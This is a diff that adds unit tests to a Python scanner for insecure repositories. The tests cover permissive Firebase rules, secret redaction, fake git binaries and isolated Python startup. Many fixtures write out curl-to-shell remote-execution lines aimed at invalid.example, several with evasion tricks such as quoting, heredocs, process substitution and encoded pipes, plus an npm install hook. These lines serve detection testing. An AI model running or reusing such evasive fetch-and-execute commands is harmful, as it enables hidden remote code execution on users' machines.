@@ -12,6 +12,7 @@ import sys
 import tempfile
 import time
 import types
+import unicodedata
 import unittest
 from unittest import mock
 from urllib.parse import unquote
@@ -135,7 +136,15 @@ class PreflightTests(unittest.TestCase):
         if environment_overrides:
             environment.update(environment_overrides)
         return subprocess.run(
-            [sys.executable, str(SCANNER), str(target), "--format", output_format, *extra],
+            [
+                sys.executable,
+                "-I",
+                str(SCANNER),
+                str(target),
+                "--format",
+                output_format,
+                *extra,
+            ],
             cwd=REPOSITORY_ROOT,
             env=environment,
             stdin=subprocess.DEVNULL,
@@ -331,6 +340,38 @@ class PreflightTests(unittest.TestCase):
         self.assertEqual(2, len(warnings))
         self.assertEqual(1, sum(item["suppressed"] for item in warnings))
         self.assertEqual(2, len({item["path"] for item in warnings}))
+
+    def test_req_007_overlapping_content_values_redact_the_full_longest_span(self) -> None:
+        scanner = load_scanner_module()
+        short_value = "ShortCredential123"
+        long_value = ("VisiblePrefix" * 7) + short_value + "Z"
+        candidate = scanner.Candidate(Path("unused"), long_value, None)
+
+        redacted = scanner._redact_content_values_from_paths(
+            [candidate],
+            [long_value, short_value],
+        )
+
+        self.assertEqual("[REDACTED]", redacted[0].display_path)
+        self.assertNotIn("VisiblePrefix", redacted[0].display_path)
+        self.assertNotIn(short_value, redacted[0].display_path)
+
+    def test_req_007_canonically_equivalent_unicode_path_is_redacted_in_every_format(self) -> None:
+        fixture = RepositoryFixture(self)
+        composed = "éSecretCredential12345"
+        decomposed = unicodedata.normalize("NFD", composed)
+        assignment_name = "NEXT_PUBLIC_" + "ADMIN_KEY"
+        fixture.write("config.env", f"{assignment_name}={composed}\n")
+        fixture.write(decomposed, synthetic_cloud_key() + "\n")
+
+        for output_format in ("text", "json", "sarif"):
+            with self.subTest(output_format=output_format):
+                completed = self.run_scanner(fixture.root, output_format)
+                normalized_output = unicodedata.normalize("NFC", unquote(completed.stdout))
+                self.assertEqual(1, completed.returncode)
+                self.assertNotIn(composed, normalized_output)
+                self.assertNotIn(decomposed, completed.stdout)
+                self.assertIn("REDACTED", completed.stdout)
 
     def test_req_007_path_format_controls_are_escaped_in_every_format(self) -> None:
         fixture = RepositoryFixture(self)
@@ -570,6 +611,78 @@ class PreflightTests(unittest.TestCase):
         )
         self.assertEqual(2, len(findings))
 
+    def test_req_008_literal_string_decimal_and_null_tautologies_block(self) -> None:
+        fixture = RepositoryFixture(self)
+        fixture.write(
+            "firestore.rules",
+            'allow read: if "x" == "x";\n'
+            "allow write: if 0.0 == 0.00;\n"
+            "allow create: if null == null;\n"
+            'allow update: if "x" == "y";\n'
+            "allow delete: if 1.0 == 2.0;\n",
+        )
+        fixture.write(
+            "database.rules.json",
+            '{"rules":{".read":"\'x\' == \'x\'",".write":"null == 1"}}\n',
+        )
+
+        report = self.json_report(self.run_scanner(fixture.root))
+        findings = [
+            finding
+            for finding in report["findings"]
+            if finding["rule_id"] == "VW-FIREBASE-PERMISSIVE-RULE"
+        ]
+        self.assertEqual([1, 2, 3], [item["line"] for item in findings if item["path"] == "firestore.rules"])
+        self.assertEqual(1, len([item for item in findings if item["path"] == "database.rules.json"]))
+
+    def test_req_008_literal_tautologies_inside_or_conditions_block(self) -> None:
+        fixture = RepositoryFixture(self)
+        fixture.write(
+            "firestore.rules",
+            "allow read: if request.auth != null || 1 == 1;\n"
+            "allow write: if request.auth != null || \"x\" == 'x';\n"
+            "allow create: if request.auth != null || false == false;\n"
+            "allow update: if request.auth != null || !false;\n"
+            "allow delete: if request.auth != null || true == false;\n",
+        )
+        fixture.write(
+            "database.rules.json",
+            json.dumps({"rules": {".read": "auth != null || null == null"}}),
+        )
+        fixture.write(
+            "database.note.rules.json",
+            json.dumps({"rules": {"note": ".read: data || 1 == 1"}}),
+        )
+
+        report = self.json_report(self.run_scanner(fixture.root))
+        findings = [
+            finding
+            for finding in report["findings"]
+            if finding["rule_id"] == "VW-FIREBASE-PERMISSIVE-RULE"
+        ]
+        self.assertEqual(
+            [1, 2, 3, 4],
+            [item["line"] for item in findings if item["path"] == "firestore.rules"],
+        )
+        self.assertEqual(
+            1,
+            len([item for item in findings if item["path"] == "database.rules.json"]),
+        )
+        self.assertNotIn("database.note.rules.json", {item["path"] for item in findings})
+
+    def test_req_008_dense_or_true_scan_is_linear_in_practice(self) -> None:
+        scanner = load_scanner_module()
+        candidate = scanner.Candidate(Path("firestore.rules"), "firestore.rules", None)
+        text = "allow read: if " + " || ".join(["true"] * 20_000) + ";\n"
+        findings: list[object] = []
+
+        started = time.perf_counter()
+        scanner._scan_text(candidate, text, findings)
+        elapsed = time.perf_counter() - started
+
+        self.assertLess(elapsed, 3.0, f"dense Firebase OR scan took {elapsed:.3f}s")
+        self.assertEqual(1, len(findings))
+
     def test_req_008_firebase_tautology_scan_is_bounded_on_long_failure(self) -> None:
         scanner = load_scanner_module()
         candidate = scanner.Candidate(
@@ -759,12 +872,23 @@ class PreflightTests(unittest.TestCase):
         fixture = RepositoryFixture(self)
         fixture.write(
             "database.production.rules.json",
-            '{"rules":{"items":{".read":"auth != null || true"}}}\n',
+            '{"rules":{"items":{'
+            '".read":"data.parent().hasChildren([\'a\', \'b\']) || true"}}}\n',
+        )
+        fixture.write(
+            "firestore.rules",
+            "allow read:if request.auth != null || true;\n"
+            "allow write: if(request.auth != null || true);\n"
+            "allow create: if ({'x': 1}['x'] == 1) || true;\n",
         )
         completed = self.run_scanner(fixture.root)
         report = self.json_report(completed)
         self.assertEqual(1, completed.returncode)
-        self.assertIn("VW-FIREBASE-PERMISSIVE-RULE", {item["rule_id"] for item in report["findings"]})
+        findings = [
+            item for item in report["findings"]
+            if item["rule_id"] == "VW-FIREBASE-PERMISSIVE-RULE"
+        ]
+        self.assertEqual(4, len(findings))
 
     def test_req_009_lockfile_conflict_and_install_script_are_visible(self) -> None:
         fixture = RepositoryFixture(self)
@@ -864,6 +988,61 @@ class PreflightTests(unittest.TestCase):
         }
         self.assertEqual(expected_remote, remote_lines)
         self.assertEqual(expected_lifecycle, lifecycle_lines)
+
+    def test_req_009_npm_findings_use_effective_scripts_object_and_duplicate_key_line(self) -> None:
+        fixture = RepositoryFixture(self)
+        fetcher = "cu" + "rl"
+        shell = "ba" + "sh"
+        fixture.write(
+            "package.json",
+            "{\n"
+            '  "install": "metadata only",\n'
+            '  "scripts": {\n'
+            '    "install": "printf safe",\n'
+            f'    "install": "{fetcher} https://invalid.example/tool | {shell}"\n'
+            "  }\n"
+            "}\n",
+        )
+
+        report = self.json_report(self.run_scanner(fixture.root))
+        relevant = {
+            finding["rule_id"]: finding["line"]
+            for finding in report["findings"]
+            if finding["rule_id"] in {"VW-INSTALL-SCRIPT", "VW-REMOTE-INSTALL-SCRIPT"}
+        }
+        self.assertEqual(
+            {"VW-INSTALL-SCRIPT": 5, "VW-REMOTE-INSTALL-SCRIPT": 5},
+            relevant,
+        )
+
+    def test_req_009_npm_line_mapping_matches_unicode_line_separators(self) -> None:
+        fixture = RepositoryFixture(self)
+        fetcher = "cu" + "rl"
+        text = (
+            "{\n"
+            '  "note": "one\u2028two\u2029three\u0085four",\n'
+            '  "scripts": {\n'
+            f'    "install": "{fetcher} https://invalid.example/tool | sh"\n'
+            "  }\n"
+            "}\n"
+        )
+        fixture.write("package.json", text)
+
+        report = self.json_report(self.run_scanner(fixture.root))
+        expected_line = next(
+            index
+            for index, line in enumerate(text.splitlines(), start=1)
+            if '"install"' in line
+        )
+        relevant = {
+            finding["rule_id"]: finding["line"]
+            for finding in report["findings"]
+            if finding["rule_id"] in {"VW-INSTALL-SCRIPT", "VW-REMOTE-INSTALL-SCRIPT"}
+        }
+        self.assertEqual(
+            {"VW-INSTALL-SCRIPT": expected_line, "VW-REMOTE-INSTALL-SCRIPT": expected_line},
+            relevant,
+        )
 
     def test_req_009_remote_install_wrappers_and_multiline_pipelines_block(self) -> None:
         fixture = RepositoryFixture(self)
@@ -1037,6 +1216,257 @@ class PreflightTests(unittest.TestCase):
         self.assertEqual({1, 2, 3, 4}, remote)
         self.assertEqual({5}, unparsed)
 
+    def test_req_009_control_words_and_process_wrappers_cannot_hide_remote_execution(self) -> None:
+        fixture = RepositoryFixture(self)
+        fetcher = "cu" + "rl"
+        shell = "ba" + "sh"
+        fixture.write(
+            "wrappers.sh",
+            f"nice {fetcher} https://invalid.example/nice | {shell}\n"
+            f"setsid {fetcher} https://invalid.example/setsid | python3\n"
+            f"builtin command {fetcher} https://invalid.example/builtin | sh\n"
+            f"if {fetcher} https://invalid.example/if | {shell}; then :; fi\n"
+            f"while {fetcher} https://invalid.example/while | {shell}; do :; done\n"
+            f"nice --unknown {fetcher} https://invalid.example/nice-ambiguous | {shell}\n"
+            f"setsid --unknown {fetcher} https://invalid.example/setsid-ambiguous | sh\n"
+            f"builtin {fetcher} https://invalid.example/not-a-builtin | sh\n",
+        )
+
+        report = self.json_report(self.run_scanner(fixture.root))
+        remote = {
+            finding["line"]
+            for finding in report["findings"]
+            if finding["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
+        }
+        unparsed = {
+            finding["line"]
+            for finding in report["findings"]
+            if finding["rule_id"] == "VW-SHELL-PIPELINE-UNPARSED"
+        }
+        self.assertEqual({1, 2, 3, 4, 5}, remote)
+        self.assertEqual({6, 7, 8}, unparsed)
+
+    def test_req_009_nested_launchers_redirections_and_substitutions_block(self) -> None:
+        fixture = RepositoryFixture(self)
+        fetcher = "cu" + "rl"
+        shell = "ba" + "sh"
+        remote = f"{fetcher} https://invalid.example/tool"
+        quoted_fetcher = fetcher[0] + '""' + fetcher[1:]
+        escaped_fetcher = fetcher[0] + "\\" + fetcher[1:]
+        ansi_quoted_fetcher = fetcher[0] + "$'" + fetcher[1] + "'" + fetcher[2:]
+        fixture.write(
+            "launchers.sh",
+            f"2>/dev/null {remote} | {shell}\n"
+            f"{remote} | 2>/dev/null {shell}\n"
+            f"builtin exec {remote} | {shell}\n"
+            f"builtin eval '{remote}' | {shell}\n"
+            f"time ! {remote} | {shell}\n"
+            f"case x in x) {remote} | {shell};; esac\n"
+            f"f() {{ {remote} | {shell}; }}; f\n"
+            f"busybox nice {remote} | {shell}\n"
+            f"until {remote} | {shell}; do :; done\n"
+            f"coproc {remote} | {shell}\n"
+            f"{remote} | source /dev/stdin\n"
+            f"{remote} | nice {shell}\n"
+            f"stdbuf -o0 {remote} | sh\n"
+            f"ionice {remote} | sh\n"
+            f"taskset -c 0 {remote} | sh\n"
+            f"command nice {remote} | sh\n"
+            f"{remote} | tee >({shell})\n"
+            f"{remote} > >({shell})\n"
+            f"{shell} <({remote})\n"
+            f'{shell} -c "$({remote})"\n'
+            f"chrt 0 {remote} | sh\n"
+            f"doas {remote} | sh\n"
+            f"synthetic-launcher {remote} | sh\n"
+            f"printf '%s' '{remote} | {shell}'\n"
+            f"{remote} | cat\n"
+            f'{shell} <<< "$({remote})"\n'
+            f"{remote} | xargs -0 sh -c\n"
+            f"{quoted_fetcher} https://invalid.example/quoted | sh\n"
+            f"{escaped_fetcher} https://invalid.example/escaped | sh\n"
+            f"{shell} -c $'{remote} | sh'\n"
+            f"echo '{remote} | sh' | sh\n"
+            f"printf '%s' '{remote} | sh' | {shell}\n"
+            f"{shell} -s <<< '{remote} | sh'\n"
+            f"{remote} | cmd.exe\n"
+            f"{remote} | busybox ash\n"
+            f"{shell} 0<<<'{remote} | sh'\n"
+            f"{ansi_quoted_fetcher} https://invalid.example/ansi-quoted | sh\n"
+            f'{shell} -c "$(printf \'%s\' \'{remote} | sh\')"\n'
+            f'eval "$(printf \'%s\' \'{remote} | sh\')"\n'
+            f'{shell} <<< "$(printf \'%s\' \'{remote} | sh\')"\n'
+            f"{shell} -c $'{fetcher} https://invalid.example/encoded \\x7c sh'\n",
+        )
+
+        report = self.json_report(self.run_scanner(fixture.root))
+        blocked = {
+            finding["line"]
+            for finding in report["findings"]
+            if finding["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
+        }
+        unparsed = {
+            finding["line"]
+            for finding in report["findings"]
+            if finding["rule_id"] == "VW-SHELL-PIPELINE-UNPARSED"
+        }
+        self.assertEqual(set(range(1, 23)) | set(range(26, 42)), blocked)
+        self.assertEqual({23}, unparsed)
+
+    def test_req_009_compound_commands_and_unknown_shell_launchers_fail_closed(self) -> None:
+        fixture = RepositoryFixture(self)
+        fetcher = "cu" + "rl"
+        fixture.write(
+            "compound.sh",
+            f"{{ {fetcher} https://invalid.example/braces; }} | sh\n"
+            f"( {fetcher} https://invalid.example/subshell; ) | sh\n"
+            f"if true; then {fetcher} https://invalid.example/conditional; fi | sh\n"
+            f"{fetcher} https://invalid.example/download; echo local | sh\n"
+            f"{{ echo {fetcher}; }} | sh\n"
+            f"{fetcher} https://invalid.example/trace | strace sh\n"
+            f"{fetcher} https://invalid.example/valgrind | valgrind sh\n"
+            f"{{ {fetcher} https://invalid.example/stderr; }} 2>/dev/null | sh\n"
+            f"{{ {fetcher} https://invalid.example/data; }} | printf sh\n",
+        )
+
+        report = self.json_report(self.run_scanner(fixture.root))
+        remote = {
+            finding["line"]
+            for finding in report["findings"]
+            if finding["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
+        }
+        unparsed = {
+            finding["line"]
+            for finding in report["findings"]
+            if finding["rule_id"] == "VW-SHELL-PIPELINE-UNPARSED"
+        }
+        self.assertEqual({1, 2, 3, 8}, remote)
+        self.assertEqual({6, 7}, unparsed)
+
+    def test_req_009_executable_heredoc_expansion_cannot_hide_remote_content(self) -> None:
+        fixture = RepositoryFixture(self)
+        fetcher = "cu" + "rl"
+        fixture.write(
+            "heredoc.sh",
+            "bash <<EOF\n"
+            f"$({fetcher} https://invalid.example/tool)\n"
+            "EOF\n"
+            "cat <<'EOF' | sh\n"
+            f"{fetcher} https://invalid.example/tool | sh\n"
+            "EOF\n"
+            "cat /dev/null | sh <<'EOF'\n"
+            f"{fetcher} https://invalid.example/tool | sh\n"
+            "EOF\n",
+        )
+
+        report = self.json_report(self.run_scanner(fixture.root))
+        remote = [
+            finding
+            for finding in report["findings"]
+            if finding["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
+        ]
+        self.assertEqual([2, 5, 8], [finding["line"] for finding in remote])
+
+    def test_req_009_descriptor_heredocs_remain_data_only(self) -> None:
+        fixture = RepositoryFixture(self)
+        fetcher = "cu" + "rl"
+        fixture.write(
+            "data.sh",
+            "cat 0<<'EOF'\n"
+            f"{fetcher} https://invalid.example/data | sh\n"
+            "EOF\n"
+            "cat {fd}<<'EOF'\n"
+            f"{fetcher} https://invalid.example/more-data | sh\n"
+            "EOF\n"
+            "cat {fd}<<'EOF' | sh\n"
+            f"{fetcher} https://invalid.example/not-stdin | sh\n"
+            "EOF\n"
+            "bash 3<<'EOF'\n"
+            f"{fetcher} https://invalid.example/not-script-input | sh\n"
+            "EOF\n",
+        )
+
+        completed = self.run_scanner(fixture.root)
+        report = self.json_report(completed)
+        self.assertEqual(0, completed.returncode)
+        self.assertEqual([], report["findings"])
+
+    def test_req_009_folded_yaml_and_docker_heredocs_are_scanned_as_shell(self) -> None:
+        fixture = RepositoryFixture(self)
+        fetcher = "cu" + "rl"
+        fixture.write(
+            "contexts.txt",
+            "run: >\n"
+            f"  {fetcher} https://invalid.example/yaml\n"
+            "  | sh\n"
+            "RUN <<EOF\n"
+            f"{fetcher} https://invalid.example/docker | sh\n"
+            "EOF\n"
+            "RUN <<'EOF'\n"
+            f"{fetcher} https://invalid.example/docker-quoted | sh\n"
+            "EOF\n"
+            "RUN --mount=type=cache <<EOF\n"
+            f"{fetcher} https://invalid.example/docker-mount | sh\n"
+            "EOF\n"
+            "RUN --network=none <<EOF\n"
+            f"{fetcher} https://invalid.example/docker-network | sh\n"
+            "EOF\n",
+        )
+
+        report = self.json_report(self.run_scanner(fixture.root))
+        remote_lines = {
+            finding["line"]
+            for finding in report["findings"]
+            if finding["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
+        }
+        self.assertEqual({2, 5, 8, 11, 14}, remote_lines)
+
+    def test_req_009_yaml_escapes_and_cmd_continuations_preserve_shell_semantics(self) -> None:
+        fixture = RepositoryFixture(self)
+        fetcher = "cu" + "rl"
+        fixture.write(
+            "encoded.yml",
+            f'run: "{fetcher} https://invalid.example/unicode \\u007c sh"\n'
+            f'run: "{fetcher} https://invalid.example/hex \\x7c sh"\n',
+        )
+        fixture.write(
+            "continuation.cmd",
+            f"{fetcher} https://invalid.example/continued ^\n"
+            "| cmd.exe\n"
+            f"{fetcher} https://invalid.example/literal ^| cmd.exe\n",
+        )
+        fixture.write(
+            "folded-paragraphs.yml",
+            "run: >\n"
+            f"  {fetcher} https://invalid.example/download\n"
+            "\n"
+            "  echo safe | sh\n"
+            "run: >\n"
+            f"  {fetcher} https://invalid.example/more-indented\n"
+            "    | sh\n",
+        )
+
+        report = self.json_report(self.run_scanner(fixture.root))
+        remote = {
+            (finding["path"], finding["line"])
+            for finding in report["findings"]
+            if finding["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
+        }
+        self.assertEqual(
+            {("continuation.cmd", 1), ("encoded.yml", 1), ("encoded.yml", 2)},
+            remote,
+        )
+        unparsed = {
+            (finding["path"], finding["line"])
+            for finding in report["findings"]
+            if finding["rule_id"] == "VW-SHELL-PIPELINE-UNPARSED"
+        }
+        self.assertEqual({("continuation.cmd", 3)}, unparsed)
+        self.assertNotIn(
+            "folded-paragraphs.yml",
+            {finding["path"] for finding in report["findings"]},
+        )
+
     def test_req_009_remote_execution_contexts_comments_interpreters_and_heredocs(self) -> None:
         fixture = RepositoryFixture(self)
         fetcher = "cu" + "rl"
@@ -1069,7 +1499,10 @@ class PreflightTests(unittest.TestCase):
             f"{fetcher} -o tool https://invalid.example/tool\n"
             f"printf safe | {shell}\n"
             f"{fetcher} is only a word in this prose.\n"
-            f"echo local | {shell}\n",
+            f"echo local | {shell}\n"
+            f"{fetcher} https://invalid.example/literal-single '|' {shell}\n"
+            f'{fetcher} https://invalid.example/literal-double "|" {shell}\n'
+            f"{fetcher} https://invalid.example/literal-escaped \\| {shell}\n",
         )
 
         completed = self.run_scanner(fixture.root)
@@ -1120,11 +1553,25 @@ class PreflightTests(unittest.TestCase):
         self.assertEqual(([], []), scanner._remote_pipe_line_numbers("!" * 1_048_576))
         direct_elapsed = time.perf_counter() - started
 
+        pipe_only = ("left|right;" * 100_000)[:1_048_576]
+        started = time.perf_counter()
+        self.assertEqual(([], []), scanner._remote_pipe_line_numbers(pipe_only))
+        pipe_elapsed = time.perf_counter() - started
+        self.assertEqual(([], []), scanner._remote_pipe_line_numbers('left | "unterminated'))
+        self.assertEqual(([], [1]), scanner._remote_pipe_line_numbers("curl https://invalid.example |"))
+
+        remote_command_flood = "curl https://invalid.example; " + ("echo x | cat; " * 70_000)
+        started = time.perf_counter()
+        self.assertEqual(([], [1]), scanner._remote_pipe_line_numbers(remote_command_flood))
+        command_flood_elapsed = time.perf_counter() - started
+
         started = time.perf_counter()
         completed = self.run_scanner(fixture.root)
         scan_elapsed = time.perf_counter() - started
 
         self.assertLess(direct_elapsed, 1.0, f"direct shell scan took {direct_elapsed:.3f}s")
+        self.assertLess(pipe_elapsed, 1.5, f"non-fetch pipeline scan took {pipe_elapsed:.3f}s")
+        self.assertLess(command_flood_elapsed, 1.5, f"shell token budget took {command_flood_elapsed:.3f}s")
         self.assertLess(scan_elapsed, 3.0, f"full scanner took {scan_elapsed:.3f}s")
         self.assertEqual(0, completed.returncode)
 
@@ -1418,6 +1865,80 @@ class PreflightTests(unittest.TestCase):
                 self.assertEqual("filesystem", report["scope"]["mode"])
                 self.assertFalse(marker.exists())
 
+    @unittest.skipIf(os.name == "nt", "Executable marker regression uses a POSIX script")
+    def test_req_010_git_from_repository_sibling_path_is_never_executed(self) -> None:
+        fixture = RepositoryFixture(self)
+        fixture.write("target/README.md", "ordinary\n")
+        executable_directory = fixture.root / "bin"
+        executable_directory.mkdir()
+        marker = fixture.base / "git-executed-from-repository-sibling"
+        fake_git = executable_directory / "git"
+        fake_git.write_text(
+            f"#!/bin/sh\nprintf executed > '{marker}'\nexit 0\n",
+            encoding="utf-8",
+        )
+        fake_git.chmod(0o700)
+
+        completed = self.run_scanner(
+            fixture.root / "target",
+            environment_overrides={"PATH": str(executable_directory)},
+        )
+        report = self.json_report(completed)
+
+        self.assertEqual(0, completed.returncode)
+        self.assertEqual("filesystem", report["scope"]["mode"])
+        self.assertFalse(marker.exists())
+
+    @unittest.skipIf(os.name == "nt", "Executable marker regression uses a POSIX script")
+    def test_req_010_nested_git_marker_cannot_narrow_controlled_path_boundary(self) -> None:
+        fixture = RepositoryFixture(self)
+        fixture.write("target/.git/HEAD", "ref: refs/heads/main\n")
+        fixture.write("target/README.md", "ordinary\n")
+        executable_directory = fixture.root / "bin"
+        executable_directory.mkdir()
+        marker = fixture.base / "git-executed-after-nested-marker"
+        fake_git = executable_directory / "git"
+        fake_git.write_text(
+            f"#!/bin/sh\nprintf executed > '{marker}'\nexit 0\n",
+            encoding="utf-8",
+        )
+        fake_git.chmod(0o700)
+
+        completed = self.run_scanner(
+            fixture.root / "target",
+            environment_overrides={"PATH": str(executable_directory)},
+        )
+        report = self.json_report(completed)
+
+        self.assertEqual(0, completed.returncode)
+        self.assertEqual("filesystem", report["scope"]["mode"])
+        self.assertFalse(marker.exists())
+
+    def test_req_010_isolated_python_ignores_project_startup_and_import_hooks(self) -> None:
+        fixture = RepositoryFixture(self, git=False)
+        import_marker = fixture.base / "queue-imported"
+        startup_marker = fixture.base / "sitecustomize-imported"
+        fixture.write(
+            "queue.py",
+            f"from pathlib import Path\nPath({str(import_marker)!r}).write_text('executed')\n",
+        )
+        fixture.write(
+            "sitecustomize.py",
+            f"from pathlib import Path\nPath({str(startup_marker)!r}).write_text('executed')\n",
+        )
+        fixture.write("README.md", "ordinary\n")
+
+        completed = self.run_scanner(
+            fixture.root,
+            environment_overrides={"PYTHONPATH": str(fixture.root)},
+        )
+        report = self.json_report(completed)
+
+        self.assertEqual(0, completed.returncode)
+        self.assertEqual([], report["tool_errors"])
+        self.assertFalse(import_marker.exists())
+        self.assertFalse(startup_marker.exists())
+
     @unittest.skipIf(os.name == "nt", "PATH symlink regression uses POSIX executable semantics")
     def test_req_010_git_from_worktree_path_symlink_is_never_executed(self) -> None:
         fixture = RepositoryFixture(self, git=False)
@@ -1433,16 +1954,20 @@ class PreflightTests(unittest.TestCase):
         fake_git.chmod(0o700)
         worktree_path = fixture.root / "bin"
         worktree_path.symlink_to(controlled_directory, target_is_directory=True)
+        root_alias = fixture.base / "root-alias"
+        root_alias.symlink_to(fixture.root, target_is_directory=True)
 
-        completed = self.run_scanner(
-            fixture.root,
-            environment_overrides={"PATH": str(worktree_path)},
-        )
-        report = self.json_report(completed)
+        for path_entry in (worktree_path, root_alias / "bin"):
+            with self.subTest(path_entry=path_entry):
+                completed = self.run_scanner(
+                    fixture.root,
+                    environment_overrides={"PATH": str(path_entry)},
+                )
+                report = self.json_report(completed)
 
-        self.assertEqual(0, completed.returncode)
-        self.assertEqual("filesystem", report["scope"]["mode"])
-        self.assertFalse(marker.exists())
+                self.assertEqual(0, completed.returncode)
+                self.assertEqual("filesystem", report["scope"]["mode"])
+                self.assertFalse(marker.exists())
 
     @unittest.skipUnless(os.name == "nt", "Windows PATH junction regression")
     def test_req_010_git_from_worktree_path_junction_is_rejected(self) -> None:
@@ -1698,6 +2223,8 @@ class PreflightTests(unittest.TestCase):
             'reason="\u200b" owner="app" approved-by="security" compensating-control="rules" expires="2099-01-01"',
             'reason="reviewed" owner="app" approved-by="\u200b" compensating-control="rules" expires="2099-01-01"',
             'reason="reviewed" owner="app" approved-by="security" compensating-control="\u200b" expires="2099-01-01"',
+            'reason="\u034f" owner="\u034f" approved-by="\u034f\u034f" compensating-control="\u034f" expires="2099-01-01"',
+            'reason="reviewed" owner="app" approved-by="app\u034f" compensating-control="rules" expires="2099-01-01"',
         )
         for metadata in cases:
             with self.subTest(metadata=metadata):
@@ -1845,6 +2372,29 @@ class PreflightTests(unittest.TestCase):
         self.assertEqual(2, finding_report.exit_code)
         self.assertEqual([], finding_report.findings)
         self.assertEqual("tool.finding-limit", finding_report.tool_errors[0].code)
+
+        redaction_fixture = RepositoryFixture(self, git=False)
+        redaction_fixture.write(
+            "config.env",
+            "password_one=FirstUniqueCredential123\n"
+            "password_two=SecondUniqueCredential456\n",
+        )
+        with mock.patch.object(scanner, "MAX_PATH_REDACTION_VALUES", 1):
+            redaction_report = scanner.scan_path(redaction_fixture.root)
+        self.assertEqual(2, redaction_report.exit_code)
+        self.assertEqual([], redaction_report.findings)
+        self.assertEqual("tool.path-redaction-limit", redaction_report.tool_errors[0].code)
+
+        expanded_redaction_fixture = RepositoryFixture(self, git=False)
+        expanded_redaction_fixture.write(
+            "config.env",
+            'password="a' + ("\u200b" * 11) + '"\n',
+        )
+        with mock.patch.object(scanner, "MAX_PATH_REDACTION_PATTERN_CHARS", 20):
+            expanded_report = scanner.scan_path(expanded_redaction_fixture.root)
+        self.assertEqual(2, expanded_report.exit_code)
+        self.assertEqual([], expanded_report.findings)
+        self.assertEqual("tool.path-redaction-limit", expanded_report.tool_errors[0].code)
 
     def test_req_011_candidate_cap_fails_closed_without_partial_findings(self) -> None:
         fixture = RepositoryFixture(self)
